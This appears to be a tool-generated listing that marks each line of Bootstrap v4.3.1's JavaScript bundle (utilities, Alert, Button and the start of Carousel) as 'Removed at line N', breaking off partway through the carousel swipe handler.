// Removed at line 1: /*!
// Removed at line 2:   * Bootstrap v4.3.1 (https://getbootstrap.com/)
// Removed at line 3:   * Copyright 2011-2019 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
// Removed at line 4:   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
// Removed at line 5:   */
// Removed at line 6: (function (global, factory) {
// Removed at line 7:   typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :
// Removed at line 8:     typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :
// Removed at line 9:       (global = global || self, factory(global.bootstrap = {}, global.jQuery, global.Popper));
// Removed at line 10: }(this, function (exports, $, Popper) {
// Removed at line 11:   'use strict';
// Removed at line 12:   $ = $ && $.hasOwnProperty('default') ? $['default'] : $;
// Removed at line 13:   Popper = Popper && Popper.hasOwnProperty('default') ? Popper['default'] : Popper;
// Removed at line 14:   function _defineProperties(target, props) {
// Removed at line 15:     for (var i = 0; i < props.length; i++) {
// Removed at line 16:       var descriptor = props[i];
// Removed at line 17:       descriptor.enumerable = descriptor.enumerable || false;
// Removed at line 18:       descriptor.configurable = true;
// Removed at line 19:       if ("value" in descriptor) descriptor.writable = true;
// Removed at line 20:       Object.defineProperty(target, descriptor.key, descriptor);
// Removed at line 21:     }
// Removed at line 22:   }
// Removed at line 23:   function _createClass(Constructor, protoProps, staticProps) {
// Removed at line 24:     if (protoProps) _defineProperties(Constructor.prototype, protoProps);
// Removed at line 25:     if (staticProps) _defineProperties(Constructor, staticProps);
// Removed at line 26:     return Constructor;
// Removed at line 27:   }
// Removed at line 28:   function _defineProperty(obj, key, value) {
// Removed at line 29:     if (key in obj) {
// Removed at line 30:       Object.defineProperty(obj, key, {
// Removed at line 31:         value: value,
// Removed at line 32:         enumerable: true,
// Removed at line 33:         configurable: true,
// Removed at line 34:         writable: true
// Removed at line 35:       });
// Removed at line 36:     } else {
// Removed at line 37:       obj[key] = value;
// Removed at line 38:     }
// Removed at line 39:     return obj;
// Removed at line 40:   }
// Removed at line 41:   function _objectSpread(target) {
// Removed at line 42:     for (var i = 1; i < arguments.length; i++) {
// Removed at line 43:       var source = arguments[i] != null ? arguments[i] : {};
// Removed at line 44:       var ownKeys = Object.keys(source);
// Removed at line 45:       if (typeof Object.getOwnPropertySymbols === 'function') {
// Removed at line 46:         ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) {
// Removed at line 47:           return Object.getOwnPropertyDescriptor(source, sym).enumerable;
// Removed at line 48:         }));
// Removed at line 49:       }
// Removed at line 50:       ownKeys.forEach(function (key) {
// Removed at line 51:         _defineProperty(target, key, source[key]);
// Removed at line 52:       });
// Removed at line 53:     }
// Removed at line 54:     return target;
// Removed at line 55:   }
// Removed at line 56:   function _inheritsLoose(subClass, superClass) {
// Removed at line 57:     subClass.prototype = Object.create(superClass.prototype);
// Removed at line 58:     subClass.prototype.constructor = subClass;
// Removed at line 59:     subClass.__proto__ = superClass;
// Removed at line 60:   }
// Removed at line 61:   /**
// Removed at line 62:    * --------------------------------------------------------------------------
// Removed at line 63:    * Bootstrap (v4.3.1): util.js
// Removed at line 64:    * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
// Removed at line 65:    * --------------------------------------------------------------------------
// Removed at line 66:    */
// Removed at line 67:   /**
// Removed at line 68:    * ------------------------------------------------------------------------
// Removed at line 69:    * Private TransitionEnd Helpers
// Removed at line 70:    * ------------------------------------------------------------------------
// Removed at line 71:    */
// Removed at line 72:   var TRANSITION_END = 'transitionend';
// Removed at line 73:   var MAX_UID = 1000000;
// Removed at line 74:   var MILLISECONDS_MULTIPLIER = 1000; // Shoutout AngusCroll (https://goo.gl/pxwQGp)
// Removed at line 75:   function toType(obj) {
// Removed at line 76:     return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
// Removed at line 77:   }
// Removed at line 78:   function getSpecialTransitionEndEvent() {
// Removed at line 79:     return {
// Removed at line 80:       bindType: TRANSITION_END,
// Removed at line 81:       delegateType: TRANSITION_END,
// Removed at line 82:       handle: function handle(event) {
// Removed at line 83:         if ($(event.target).is(this)) {
// Removed at line 84:           return event.handleObj.handler.apply(this, arguments); // eslint-disable-line prefer-rest-params
// Removed at line 85:         }
// Removed at line 86:         return undefined; // eslint-disable-line no-undefined
// Removed at line 87:       }
// Removed at line 88:     };
// Removed at line 89:   }
// Removed at line 90:   function transitionEndEmulator(duration) {
// Removed at line 91:     var _this = this;
// Removed at line 92:     var called = false;
// Removed at line 93:     $(this).one(Util.TRANSITION_END, function () {
// Removed at line 94:       called = true;
// Removed at line 95:     });
// Removed at line 96:     setTimeout(function () {
// Removed at line 97:       if (!called) {
// Removed at line 98:         Util.triggerTransitionEnd(_this);
// Removed at line 99:       }
// Removed at line 100:     }, duration);
// Removed at line 101:     return this;
// Removed at line 102:   }
// Removed at line 103:   function setTransitionEndSupport() {
// Removed at line 104:     $.fn.emulateTransitionEnd = transitionEndEmulator;
// Removed at line 105:     $.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();
// Removed at line 106:   }
// Removed at line 107:   /**
// Removed at line 108:    * --------------------------------------------------------------------------
// Removed at line 109:    * Public Util Api
// Removed at line 110:    * --------------------------------------------------------------------------
// Removed at line 111:    */
// Removed at line 112:   var Util = {
// Removed at line 113:     TRANSITION_END: 'bsTransitionEnd',
// Removed at line 114:     getUID: function getUID(prefix) {
// Removed at line 115:       do {
// Removed at line 116:         // eslint-disable-next-line no-bitwise
// Removed at line 117:         prefix += ~~(Math.random() * MAX_UID); // "~~" acts like a faster Math.floor() here
// Removed at line 118:       } while (document.getElementById(prefix));
// Removed at line 119:       return prefix;
// Removed at line 120:     },
// Removed at line 121:     getSelectorFromElement: function getSelectorFromElement(element) {
// Removed at line 122:       var selector = element.getAttribute('data-target');
// Removed at line 123:       if (!selector || selector === '#') {
// Removed at line 124:         var hrefAttr = element.getAttribute('href');
// Removed at line 125:         selector = hrefAttr && hrefAttr !== '#' ? hrefAttr.trim() : '';
// Removed at line 126:       }
// Removed at line 127:       try {
// Removed at line 128:         return document.querySelector(selector) ? selector : null;
// Removed at line 129:       } catch (err) {
// Removed at line 130:         return null;
// Removed at line 131:       }
// Removed at line 132:     },
// Removed at line 133:     getTransitionDurationFromElement: function getTransitionDurationFromElement(element) {
// Removed at line 134:       if (!element) {
// Removed at line 135:         return 0;
// Removed at line 136:       } // Get transition-duration of the element
// Removed at line 137:       var transitionDuration = $(element).css('transition-duration');
// Removed at line 138:       var transitionDelay = $(element).css('transition-delay');
// Removed at line 139:       var floatTransitionDuration = parseFloat(transitionDuration);
// Removed at line 140:       var floatTransitionDelay = parseFloat(transitionDelay); // Return 0 if element or transition duration is not found
// Removed at line 141:       if (!floatTransitionDuration && !floatTransitionDelay) {
// Removed at line 142:         return 0;
// Removed at line 143:       } // If multiple durations are defined, take the first
// Removed at line 144:       transitionDuration = transitionDuration.split(',')[0];
// Removed at line 145:       transitionDelay = transitionDelay.split(',')[0];
// Removed at line 146:       return (parseFloat(transitionDuration) + parseFloat(transitionDelay)) * MILLISECONDS_MULTIPLIER;
// Removed at line 147:     },
// Removed at line 148:     reflow: function reflow(element) {
// Removed at line 149:       return element.offsetHeight;
// Removed at line 150:     },
// Removed at line 151:     triggerTransitionEnd: function triggerTransitionEnd(element) {
// Removed at line 152:       $(element).trigger(TRANSITION_END);
// Removed at line 153:     },
// Removed at line 154:     // TODO: Remove in v5
// Removed at line 155:     supportsTransitionEnd: function supportsTransitionEnd() {
// Removed at line 156:       return Boolean(TRANSITION_END);
// Removed at line 157:     },
// Removed at line 158:     isElement: function isElement(obj) {
// Removed at line 159:       return (obj[0] || obj).nodeType;
// Removed at line 160:     },
// Removed at line 161:     typeCheckConfig: function typeCheckConfig(componentName, config, configTypes) {
// Removed at line 162:       for (var property in configTypes) {
// Removed at line 163:         if (Object.prototype.hasOwnProperty.call(configTypes, property)) {
// Removed at line 164:           var expectedTypes = configTypes[property];
// Removed at line 165:           var value = config[property];
// Removed at line 166:           var valueType = value && Util.isElement(value) ? 'element' : toType(value);
// Removed at line 167:           if (!new RegExp(expectedTypes).test(valueType)) {
// Removed at line 168:             throw new Error(componentName.toUpperCase() + ": " + ("Option \"" + property + "\" provided type \"" + valueType + "\" ") + ("but expected type \"" + expectedTypes + "\"."));
// Removed at line 169:           }
// Removed at line 170:         }
// Removed at line 171:       }
// Removed at line 172:     },
// Removed at line 173:     findShadowRoot: function findShadowRoot(element) {
// Removed at line 174:       if (!document.documentElement.attachShadow) {
// Removed at line 175:         return null;
// Removed at line 176:       } // Can find the shadow root otherwise it'll return the document
// Removed at line 177:       if (typeof element.getRootNode === 'function') {
// Removed at line 178:         var root = element.getRootNode();
// Removed at line 179:         return root instanceof ShadowRoot ? root : null;
// Removed at line 180:       }
// Removed at line 181:       if (element instanceof ShadowRoot) {
// Removed at line 182:         return element;
// Removed at line 183:       } // when we don't find a shadow root
// Removed at line 184:       if (!element.parentNode) {
// Removed at line 185:         return null;
// Removed at line 186:       }
// Removed at line 187:       return Util.findShadowRoot(element.parentNode);
// Removed at line 188:     }
// Removed at line 189:   };
// Removed at line 190:   setTransitionEndSupport();
// Removed at line 191:   /**
// Removed at line 192:    * ------------------------------------------------------------------------
// Removed at line 193:    * Constants
// Removed at line 194:    * ------------------------------------------------------------------------
// Removed at line 195:    */
// Removed at line 196:   var NAME = 'alert';
// Removed at line 197:   var VERSION = '4.3.1';
// Removed at line 198:   var DATA_KEY = 'bs.alert';
// Removed at line 199:   var EVENT_KEY = "." + DATA_KEY;
// Removed at line 200:   var DATA_API_KEY = '.data-api';
// Removed at line 201:   var JQUERY_NO_CONFLICT = $.fn[NAME];
// Removed at line 202:   var Selector = {
// Removed at line 203:     DISMISS: '[data-dismiss="alert"]'
// Removed at line 204:   };
// Removed at line 205:   var Event = {
// Removed at line 206:     CLOSE: "close" + EVENT_KEY,
// Removed at line 207:     CLOSED: "closed" + EVENT_KEY,
// Removed at line 208:     CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
// Removed at line 209:   };
// Removed at line 210:   var ClassName = {
// Removed at line 211:     ALERT: 'alert',
// Removed at line 212:     FADE: 'fade',
// Removed at line 213:     SHOW: 'show'
// Removed at line 214:     /**
// Removed at line 215:      * ------------------------------------------------------------------------
// Removed at line 216:      * Class Definition
// Removed at line 217:      * ------------------------------------------------------------------------
// Removed at line 218:      */
// Removed at line 219:   };
// Removed at line 220:   var Alert =
// Removed at line 221:     /*#__PURE__*/
// Removed at line 222:     function () {
// Removed at line 223:       function Alert(element) {
// Removed at line 224:         this._element = element;
// Removed at line 225:       } // Getters
// Removed at line 226:       var _proto = Alert.prototype;
// Removed at line 227:       // Public
// Removed at line 228:       _proto.close = function close(element) {
// Removed at line 229:         var rootElement = this._element;
// Removed at line 230:         if (element) {
// Removed at line 231:           rootElement = this._getRootElement(element);
// Removed at line 232:         }
// Removed at line 233:         var customEvent = this._triggerCloseEvent(rootElement);
// Removed at line 234:         if (customEvent.isDefaultPrevented()) {
// Removed at line 235:           return;
// Removed at line 236:         }
// Removed at line 237:         this._removeElement(rootElement);
// Removed at line 238:       };
// Removed at line 239:       _proto.dispose = function dispose() {
// Removed at line 240:         $.removeData(this._element, DATA_KEY);
// Removed at line 241:         this._element = null;
// Removed at line 242:       } // Private
// Removed at line 243:         ;
// Removed at line 244:       _proto._getRootElement = function _getRootElement(element) {
// Removed at line 245:         var selector = Util.getSelectorFromElement(element);
// Removed at line 246:         var parent = false;
// Removed at line 247:         if (selector) {
// Removed at line 248:           parent = document.querySelector(selector);
// Removed at line 249:         }
// Removed at line 250:         if (!parent) {
// Removed at line 251:           parent = $(element).closest("." + ClassName.ALERT)[0];
// Removed at line 252:         }
// Removed at line 253:         return parent;
// Removed at line 254:       };
// Removed at line 255:       _proto._triggerCloseEvent = function _triggerCloseEvent(element) {
// Removed at line 256:         var closeEvent = $.Event(Event.CLOSE);
// Removed at line 257:         $(element).trigger(closeEvent);
// Removed at line 258:         return closeEvent;
// Removed at line 259:       };
// Removed at line 260:       _proto._removeElement = function _removeElement(element) {
// Removed at line 261:         var _this = this;
// Removed at line 262:         $(element).removeClass(ClassName.SHOW);
// Removed at line 263:         if (!$(element).hasClass(ClassName.FADE)) {
// Removed at line 264:           this._destroyElement(element);
// Removed at line 265:           return;
// Removed at line 266:         }
// Removed at line 267:         var transitionDuration = Util.getTransitionDurationFromElement(element);
// Removed at line 268:         $(element).one(Util.TRANSITION_END, function (event) {
// Removed at line 269:           return _this._destroyElement(element, event);
// Removed at line 270:         }).emulateTransitionEnd(transitionDuration);
// Removed at line 271:       };
// Removed at line 272:       _proto._destroyElement = function _destroyElement(element) {
// Removed at line 273:         $(element).detach().trigger(Event.CLOSED).remove();
// Removed at line 274:       } // Static
// Removed at line 275:         ;
// Removed at line 276:       Alert._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 277:         return this.each(function () {
// Removed at line 278:           var $element = $(this);
// Removed at line 279:           var data = $element.data(DATA_KEY);
// Removed at line 280:           if (!data) {
// Removed at line 281:             data = new Alert(this);
// Removed at line 282:             $element.data(DATA_KEY, data);
// Removed at line 283:           }
// Removed at line 284:           if (config === 'close') {
// Removed at line 285:             data[config](this);
// Removed at line 286:           }
// Removed at line 287:         });
// Removed at line 288:       };
// Removed at line 289:       Alert._handleDismiss = function _handleDismiss(alertInstance) {
// Removed at line 290:         return function (event) {
// Removed at line 291:           if (event) {
// Removed at line 292:             event.preventDefault();
// Removed at line 293:           }
// Removed at line 294:           alertInstance.close(this);
// Removed at line 295:         };
// Removed at line 296:       };
// Removed at line 297:       _createClass(Alert, null, [{
// Removed at line 298:         key: "VERSION",
// Removed at line 299:         get: function get() {
// Removed at line 300:           return VERSION;
// Removed at line 301:         }
// Removed at line 302:       }]);
// Removed at line 303:       return Alert;
// Removed at line 304:     }();
// Removed at line 305:   /**
// Removed at line 306:    * ------------------------------------------------------------------------
// Removed at line 307:    * Data Api implementation
// Removed at line 308:    * ------------------------------------------------------------------------
// Removed at line 309:    */
// Removed at line 310:   $(document).on(Event.CLICK_DATA_API, Selector.DISMISS, Alert._handleDismiss(new Alert()));
// Removed at line 311:   /**
// Removed at line 312:    * ------------------------------------------------------------------------
// Removed at line 313:    * jQuery
// Removed at line 314:    * ------------------------------------------------------------------------
// Removed at line 315:    */
// Removed at line 316:   $.fn[NAME] = Alert._jQueryInterface;
// Removed at line 317:   $.fn[NAME].Constructor = Alert;
// Removed at line 318:   $.fn[NAME].noConflict = function () {
// Removed at line 319:     $.fn[NAME] = JQUERY_NO_CONFLICT;
// Removed at line 320:     return Alert._jQueryInterface;
// Removed at line 321:   };
// Removed at line 322:   /**
// Removed at line 323:    * ------------------------------------------------------------------------
// Removed at line 324:    * Constants
// Removed at line 325:    * ------------------------------------------------------------------------
// Removed at line 326:    */
// Removed at line 327:   var NAME$1 = 'button';
// Removed at line 328:   var VERSION$1 = '4.3.1';
// Removed at line 329:   var DATA_KEY$1 = 'bs.button';
// Removed at line 330:   var EVENT_KEY$1 = "." + DATA_KEY$1;
// Removed at line 331:   var DATA_API_KEY$1 = '.data-api';
// Removed at line 332:   var JQUERY_NO_CONFLICT$1 = $.fn[NAME$1];
// Removed at line 333:   var ClassName$1 = {
// Removed at line 334:     ACTIVE: 'active',
// Removed at line 335:     BUTTON: 'btn',
// Removed at line 336:     FOCUS: 'focus'
// Removed at line 337:   };
// Removed at line 338:   var Selector$1 = {
// Removed at line 339:     DATA_TOGGLE_CARROT: '[data-toggle^="button"]',
// Removed at line 340:     DATA_TOGGLE: '[data-toggle="buttons"]',
// Removed at line 341:     INPUT: 'input:not([type="hidden"])',
// Removed at line 342:     ACTIVE: '.active',
// Removed at line 343:     BUTTON: '.btn'
// Removed at line 344:   };
// Removed at line 345:   var Event$1 = {
// Removed at line 346:     CLICK_DATA_API: "click" + EVENT_KEY$1 + DATA_API_KEY$1,
// Removed at line 347:     FOCUS_BLUR_DATA_API: "focus" + EVENT_KEY$1 + DATA_API_KEY$1 + " " + ("blur" + EVENT_KEY$1 + DATA_API_KEY$1)
// Removed at line 348:     /**
// Removed at line 349:      * ------------------------------------------------------------------------
// Removed at line 350:      * Class Definition
// Removed at line 351:      * ------------------------------------------------------------------------
// Removed at line 352:      */
// Removed at line 353:   };
// Removed at line 354:   var Button =
// Removed at line 355:     /*#__PURE__*/
// Removed at line 356:     function () {
// Removed at line 357:       function Button(element) {
// Removed at line 358:         this._element = element;
// Removed at line 359:       } // Getters
// Removed at line 360:       var _proto = Button.prototype;
// Removed at line 361:       // Public
// Removed at line 362:       _proto.toggle = function toggle() {
// Removed at line 363:         var triggerChangeEvent = true;
// Removed at line 364:         var addAriaPressed = true;
// Removed at line 365:         var rootElement = $(this._element).closest(Selector$1.DATA_TOGGLE)[0];
// Removed at line 366:         if (rootElement) {
// Removed at line 367:           var input = this._element.querySelector(Selector$1.INPUT);
// Removed at line 368:           if (input) {
// Removed at line 369:             if (input.type === 'radio') {
// Removed at line 370:               if (input.checked && this._element.classList.contains(ClassName$1.ACTIVE)) {
// Removed at line 371:                 triggerChangeEvent = false;
// Removed at line 372:               } else {
// Removed at line 373:                 var activeElement = rootElement.querySelector(Selector$1.ACTIVE);
// Removed at line 374:                 if (activeElement) {
// Removed at line 375:                   $(activeElement).removeClass(ClassName$1.ACTIVE);
// Removed at line 376:                 }
// Removed at line 377:               }
// Removed at line 378:             }
// Removed at line 379:             if (triggerChangeEvent) {
// Removed at line 380:               if (input.hasAttribute('disabled') || rootElement.hasAttribute('disabled') || input.classList.contains('disabled') || rootElement.classList.contains('disabled')) {
// Removed at line 381:                 return;
// Removed at line 382:               }
// Removed at line 383:               input.checked = !this._element.classList.contains(ClassName$1.ACTIVE);
// Removed at line 384:               $(input).trigger('change');
// Removed at line 385:             }
// Removed at line 386:             input.focus();
// Removed at line 387:             addAriaPressed = false;
// Removed at line 388:           }
// Removed at line 389:         }
// Removed at line 390:         if (addAriaPressed) {
// Removed at line 391:           this._element.setAttribute('aria-pressed', !this._element.classList.contains(ClassName$1.ACTIVE));
// Removed at line 392:         }
// Removed at line 393:         if (triggerChangeEvent) {
// Removed at line 394:           $(this._element).toggleClass(ClassName$1.ACTIVE);
// Removed at line 395:         }
// Removed at line 396:       };
// Removed at line 397:       _proto.dispose = function dispose() {
// Removed at line 398:         $.removeData(this._element, DATA_KEY$1);
// Removed at line 399:         this._element = null;
// Removed at line 400:       } // Static
// Removed at line 401:         ;
// Removed at line 402:       Button._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 403:         return this.each(function () {
// Removed at line 404:           var data = $(this).data(DATA_KEY$1);
// Removed at line 405:           if (!data) {
// Removed at line 406:             data = new Button(this);
// Removed at line 407:             $(this).data(DATA_KEY$1, data);
// Removed at line 408:           }
// Removed at line 409:           if (config === 'toggle') {
// Removed at line 410:             data[config]();
// Removed at line 411:           }
// Removed at line 412:         });
// Removed at line 413:       };
// Removed at line 414:       _createClass(Button, null, [{
// Removed at line 415:         key: "VERSION",
// Removed at line 416:         get: function get() {
// Removed at line 417:           return VERSION$1;
// Removed at line 418:         }
// Removed at line 419:       }]);
// Removed at line 420:       return Button;
// Removed at line 421:     }();
// Removed at line 422:   /**
// Removed at line 423:    * ------------------------------------------------------------------------
// Removed at line 424:    * Data Api implementation
// Removed at line 425:    * ------------------------------------------------------------------------
// Removed at line 426:    */
// Removed at line 427:   $(document).on(Event$1.CLICK_DATA_API, Selector$1.DATA_TOGGLE_CARROT, function (event) {
// Removed at line 428:     event.preventDefault();
// Removed at line 429:     var button = event.target;
// Removed at line 430:     if (!$(button).hasClass(ClassName$1.BUTTON)) {
// Removed at line 431:       button = $(button).closest(Selector$1.BUTTON);
// Removed at line 432:     }
// Removed at line 433:     Button._jQueryInterface.call($(button), 'toggle');
// Removed at line 434:   }).on(Event$1.FOCUS_BLUR_DATA_API, Selector$1.DATA_TOGGLE_CARROT, function (event) {
// Removed at line 435:     var button = $(event.target).closest(Selector$1.BUTTON)[0];
// Removed at line 436:     $(button).toggleClass(ClassName$1.FOCUS, /^focus(in)?$/.test(event.type));
// Removed at line 437:   });
// Removed at line 438:   /**
// Removed at line 439:    * ------------------------------------------------------------------------
// Removed at line 440:    * jQuery
// Removed at line 441:    * ------------------------------------------------------------------------
// Removed at line 442:    */
// Removed at line 443:   $.fn[NAME$1] = Button._jQueryInterface;
// Removed at line 444:   $.fn[NAME$1].Constructor = Button;
// Removed at line 445:   $.fn[NAME$1].noConflict = function () {
// Removed at line 446:     $.fn[NAME$1] = JQUERY_NO_CONFLICT$1;
// Removed at line 447:     return Button._jQueryInterface;
// Removed at line 448:   };
// Removed at line 449:   /**
// Removed at line 450:    * ------------------------------------------------------------------------
// Removed at line 451:    * Constants
// Removed at line 452:    * ------------------------------------------------------------------------
// Removed at line 453:    */
// Removed at line 454:   var NAME$2 = 'carousel';
// Removed at line 455:   var VERSION$2 = '4.3.1';
// Removed at line 456:   var DATA_KEY$2 = 'bs.carousel';
// Removed at line 457:   var EVENT_KEY$2 = "." + DATA_KEY$2;
// Removed at line 458:   var DATA_API_KEY$2 = '.data-api';
// Removed at line 459:   var JQUERY_NO_CONFLICT$2 = $.fn[NAME$2];
// Removed at line 460:   var ARROW_LEFT_KEYCODE = 37; // KeyboardEvent.which value for left arrow key
// Removed at line 461:   var ARROW_RIGHT_KEYCODE = 39; // KeyboardEvent.which value for right arrow key
// Removed at line 462:   var TOUCHEVENT_COMPAT_WAIT = 500; // Time for mouse compat events to fire after touch
// Removed at line 463:   var SWIPE_THRESHOLD = 40;
// Removed at line 464:   var Default = {
// Removed at line 465:     interval: 5000,
// Removed at line 466:     keyboard: true,
// Removed at line 467:     slide: false,
// Removed at line 468:     pause: 'hover',
// Removed at line 469:     wrap: true,
// Removed at line 470:     touch: true
// Removed at line 471:   };
// Removed at line 472:   var DefaultType = {
// Removed at line 473:     interval: '(number|boolean)',
// Removed at line 474:     keyboard: 'boolean',
// Removed at line 475:     slide: '(boolean|string)',
// Removed at line 476:     pause: '(string|boolean)',
// Removed at line 477:     wrap: 'boolean',
// Removed at line 478:     touch: 'boolean'
// Removed at line 479:   };
// Removed at line 480:   var Direction = {
// Removed at line 481:     NEXT: 'next',
// Removed at line 482:     PREV: 'prev',
// Removed at line 483:     LEFT: 'left',
// Removed at line 484:     RIGHT: 'right'
// Removed at line 485:   };
// Removed at line 486:   var Event$2 = {
// Removed at line 487:     SLIDE: "slide" + EVENT_KEY$2,
// Removed at line 488:     SLID: "slid" + EVENT_KEY$2,
// Removed at line 489:     KEYDOWN: "keydown" + EVENT_KEY$2,
// Removed at line 490:     MOUSEENTER: "mouseenter" + EVENT_KEY$2,
// Removed at line 491:     MOUSELEAVE: "mouseleave" + EVENT_KEY$2,
// Removed at line 492:     TOUCHSTART: "touchstart" + EVENT_KEY$2,
// Removed at line 493:     TOUCHMOVE: "touchmove" + EVENT_KEY$2,
// Removed at line 494:     TOUCHEND: "touchend" + EVENT_KEY$2,
// Removed at line 495:     POINTERDOWN: "pointerdown" + EVENT_KEY$2,
// Removed at line 496:     POINTERUP: "pointerup" + EVENT_KEY$2,
// Removed at line 497:     DRAG_START: "dragstart" + EVENT_KEY$2,
// Removed at line 498:     LOAD_DATA_API: "load" + EVENT_KEY$2 + DATA_API_KEY$2,
// Removed at line 499:     CLICK_DATA_API: "click" + EVENT_KEY$2 + DATA_API_KEY$2
// Removed at line 500:   };
// Removed at line 501:   var ClassName$2 = {
// Removed at line 502:     CAROUSEL: 'carousel',
// Removed at line 503:     ACTIVE: 'active',
// Removed at line 504:     SLIDE: 'slide',
// Removed at line 505:     RIGHT: 'carousel-item-right',
// Removed at line 506:     LEFT: 'carousel-item-left',
// Removed at line 507:     NEXT: 'carousel-item-next',
// Removed at line 508:     PREV: 'carousel-item-prev',
// Removed at line 509:     ITEM: 'carousel-item',
// Removed at line 510:     POINTER_EVENT: 'pointer-event'
// Removed at line 511:   };
// Removed at line 512:   var Selector$2 = {
// Removed at line 513:     ACTIVE: '.active',
// Removed at line 514:     ACTIVE_ITEM: '.active.carousel-item',
// Removed at line 515:     ITEM: '.carousel-item',
// Removed at line 516:     ITEM_IMG: '.carousel-item img',
// Removed at line 517:     NEXT_PREV: '.carousel-item-next, .carousel-item-prev',
// Removed at line 518:     INDICATORS: '.carousel-indicators',
// Removed at line 519:     DATA_SLIDE: '[data-slide], [data-slide-to]',
// Removed at line 520:     DATA_RIDE: '[data-ride="carousel"]'
// Removed at line 521:   };
// Removed at line 522:   var PointerType = {
// Removed at line 523:     TOUCH: 'touch',
// Removed at line 524:     PEN: 'pen'
// Removed at line 525:     /**
// Removed at line 526:      * ------------------------------------------------------------------------
// Removed at line 527:      * Class Definition
// Removed at line 528:      * ------------------------------------------------------------------------
// Removed at line 529:      */
// Removed at line 530:   };
// Removed at line 531:   var Carousel =
// Removed at line 532:     /*#__PURE__*/
// Removed at line 533:     function () {
// Removed at line 534:       function Carousel(element, config) {
// Removed at line 535:         this._items = null;
// Removed at line 536:         this._interval = null;
// Removed at line 537:         this._activeElement = null;
// Removed at line 538:         this._isPaused = false;
// Removed at line 539:         this._isSliding = false;
// Removed at line 540:         this.touchTimeout = null;
// Removed at line 541:         this.touchStartX = 0;
// Removed at line 542:         this.touchDeltaX = 0;
// Removed at line 543:         this._config = this._getConfig(config);
// Removed at line 544:         this._element = element;
// Removed at line 545:         this._indicatorsElement = this._element.querySelector(Selector$2.INDICATORS);
// Removed at line 546:         this._touchSupported = 'ontouchstart' in document.documentElement || navigator.maxTouchPoints > 0;
// Removed at line 547:         this._pointerEvent = Boolean(window.PointerEvent || window.MSPointerEvent);
// Removed at line 548:         this._addEventListeners();
// Removed at line 549:       } // Getters
// Removed at line 550:       var _proto = Carousel.prototype;
// Removed at line 551:       // Public
// Removed at line 552:       _proto.next = function next() {
// Removed at line 553:         if (!this._isSliding) {
// Removed at line 554:           this._slide(Direction.NEXT);
// Removed at line 555:         }
// Removed at line 556:       };
// Removed at line 557:       _proto.nextWhenVisible = function nextWhenVisible() {
// Removed at line 558:         // Don't call next when the page isn't visible
// Removed at line 559:         // or the carousel or its parent isn't visible
// Removed at line 560:         if (!document.hidden && $(this._element).is(':visible') && $(this._element).css('visibility') !== 'hidden') {
// Removed at line 561:           this.next();
// Removed at line 562:         }
// Removed at line 563:       };
// Removed at line 564:       _proto.prev = function prev() {
// Removed at line 565:         if (!this._isSliding) {
// Removed at line 566:           this._slide(Direction.PREV);
// Removed at line 567:         }
// Removed at line 568:       };
// Removed at line 569:       _proto.pause = function pause(event) {
// Removed at line 570:         if (!event) {
// Removed at line 571:           this._isPaused = true;
// Removed at line 572:         }
// Removed at line 573:         if (this._element.querySelector(Selector$2.NEXT_PREV)) {
// Removed at line 574:           Util.triggerTransitionEnd(this._element);
// Removed at line 575:           this.cycle(true);
// Removed at line 576:         }
// Removed at line 577:         clearInterval(this._interval);
// Removed at line 578:         this._interval = null;
// Removed at line 579:       };
// Removed at line 580:       _proto.cycle = function cycle(event) {
// Removed at line 581:         if (!event) {
// Removed at line 582:           this._isPaused = false;
// Removed at line 583:         }
// Removed at line 584:         if (this._interval) {
// Removed at line 585:           clearInterval(this._interval);
// Removed at line 586:           this._interval = null;
// Removed at line 587:         }
// Removed at line 588:         if (this._config.interval && !this._isPaused) {
// Removed at line 589:           this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval);
// Removed at line 590:         }
// Removed at line 591:       };
// Removed at line 592:       _proto.to = function to(index) {
// Removed at line 593:         var _this = this;
// Removed at line 594:         this._activeElement = this._element.querySelector(Selector$2.ACTIVE_ITEM);
// Removed at line 595:         var activeIndex = this._getItemIndex(this._activeElement);
// Removed at line 596:         if (index > this._items.length - 1 || index < 0) {
// Removed at line 597:           return;
// Removed at line 598:         }
// Removed at line 599:         if (this._isSliding) {
// Removed at line 600:           $(this._element).one(Event$2.SLID, function () {
// Removed at line 601:             return _this.to(index);
// Removed at line 602:           });
// Removed at line 603:           return;
// Removed at line 604:         }
// Removed at line 605:         if (activeIndex === index) {
// Removed at line 606:           this.pause();
// Removed at line 607:           this.cycle();
// Removed at line 608:           return;
// Removed at line 609:         }
// Removed at line 610:         var direction = index > activeIndex ? Direction.NEXT : Direction.PREV;
// Removed at line 611:         this._slide(direction, this._items[index]);
// Removed at line 612:       };
// Removed at line 613:       _proto.dispose = function dispose() {
// Removed at line 614:         $(this._element).off(EVENT_KEY$2);
// Removed at line 615:         $.removeData(this._element, DATA_KEY$2);
// Removed at line 616:         this._items = null;
// Removed at line 617:         this._config = null;
// Removed at line 618:         this._element = null;
// Removed at line 619:         this._interval = null;
// Removed at line 620:         this._isPaused = null;
// Removed at line 621:         this._isSliding = null;
// Removed at line 622:         this._activeElement = null;
// Removed at line 623:         this._indicatorsElement = null;
// Removed at line 624:       } // Private
// Removed at line 625:         ;
// Removed at line 626:       _proto._getConfig = function _getConfig(config) {
// Removed at line 627:         config = _objectSpread({}, Default, config);
// Removed at line 628:         Util.typeCheckConfig(NAME$2, config, DefaultType);
// Removed at line 629:         return config;
// Removed at line 630:       };
// Removed at line 631:       _proto._handleSwipe = function _handleSwipe() {
// Removed at line 632:         var absDeltax = Math.abs(this.touchDeltaX);
// Removed at line 633:         if (absDeltax <= SWIPE_THRESHOLD) {
// Removed at line 634:           return;
// Removed at line 635:         }
// Removed at line 636:         var direction = absDeltax / this.touchDeltaX; // swipe left
// Removed at line 637:         if (direction > 0) {
// Removed at line 638:           this.prev();
// Removed at line 639:         } // swipe right
// Removed at line 640:         if (direction < 0) {
// Removed at line 641:           this.next();
